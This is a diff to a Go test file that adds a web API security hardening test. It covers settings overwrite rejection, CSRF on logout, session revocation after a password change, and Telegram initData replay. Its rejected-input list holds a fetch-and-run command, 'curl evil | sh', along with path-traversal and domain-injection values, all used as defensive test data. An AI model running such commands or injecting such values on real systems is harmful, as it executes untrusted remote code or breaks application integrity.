@@ -20,12 +20,16 @@ type client struct {
 	t      *testing.T
 	srv    *Server
 	lang   string // sent as X-Lang when set
+	addr   string // overrides r.RemoteAddr when set
 	base   string
 	cookie *http.Cookie
 }
 
 func (c *client) do(method, path, body string, csrf bool) *httptest.ResponseRecorder {
 	r := httptest.NewRequest(method, c.base+path, strings.NewReader(body))
+	if c.addr != "" {
+		r.RemoteAddr = c.addr
+	}
 	if csrf {
 		r.Header.Set(csrfHeader, "1")
 	}
@@ -346,5 +350,63 @@ func TestSubPrefixSetting(t *testing.T) {
 	}
 	if p := svc.SubPrefix(context.Background()); p != "/api/v1/" {
 		t.Fatalf("rejected value changed the prefix: %q", p)
+	}
+}
+
+func TestSecurityHardeningWebAPI(t *testing.T) {
+	c, svc, pw := newServer(t)
+	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
+		t.Fatal("login")
+	}
+
+	// Hidden and unknown internal settings cannot be overwritten via PUT /api/settings.
+	for _, body := range []string{
+		`{"key":"install.command","value":"curl evil | sh"}`,
+		`{"key":"bot.admins","value":"[1]"}`,
+		`{"key":"sub.headers","value":"[]"}`,
+		`{"key":"web.login_mode","value":"miniapp"}`,
+		`{"key":"unknown.internal","value":"x"}`,
+		`{"key":"web.decoy","value":"../../etc"}`,
+		`{"key":"web.domain","value":"evil.example/path#frag"}`,
+	} {
+		if w := c.do("PUT", "/api/settings", body, true); w.Code != 400 {
+			t.Fatalf("accepted unsafe setting %s: %d %s", body, w.Code, w.Body.String())
+		}
+	}
+
+	// POST /api/logout requires X-Vynel: 1 (CSRF protection across sibling subdomains).
+	if w := c.do("POST", "/api/logout", "{}", false); w.Code != 403 {
+		t.Fatalf("logout without X-Vynel: got %d, want 403", w.Code)
+	}
+	if w := c.do("GET", "/api/session", "", false); w.Code != 200 {
+		t.Fatalf("session ended by unauthenticated logout: %d", w.Code)
+	}
+
+	// Second browser session is revoked in web_sessions when password changes.
+	other := &client{srv: c.srv, base: c.base, addr: "198.51.100.42:5000"}
+	if w := other.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
+		t.Fatal("other login")
+	}
+	if len(svc.WebSessionIPs(context.Background())) < 2 {
+		t.Fatalf("expected 2 active session IPs, got %v", svc.WebSessionIPs(context.Background()))
+	}
+	if w := c.do("POST", "/api/account", `{"current":"`+pw+`","password":"NewPassword123!"}`, true); w.Code != 200 {
+		t.Fatalf("account password change: %d %s", w.Code, w.Body.String())
+	}
+	if ips := svc.WebSessionIPs(context.Background()); len(ips) != 1 {
+		t.Fatalf("other session IP stayed in firewall allowlist after password change: %v", ips)
+	}
+
+	// Telegram Mini App initData cannot be replayed a second time.
+	bindAdmin(t, svc, 4242)
+	signed := initData(testBotToken, 4242, time.Now())
+	tgBody, _ := json.Marshal(map[string]string{"initData": signed})
+	tgClient := &client{srv: c.srv, base: c.base, addr: "203.0.113.77:5000"}
+	if w := tgClient.do("POST", "/api/login/telegram", string(tgBody), true); w.Code != 200 {
+		t.Fatalf("first telegram login: %d %s", w.Code, w.Body.String())
+	}
+	replayClient := &client{srv: c.srv, base: c.base, addr: "203.0.113.88:5000"}
+	if w := replayClient.do("POST", "/api/login/telegram", string(tgBody), true); w.Code != 401 {
+		t.Fatalf("replayed telegram initData accepted: %d %s", w.Code, w.Body.String())
 	}
 }
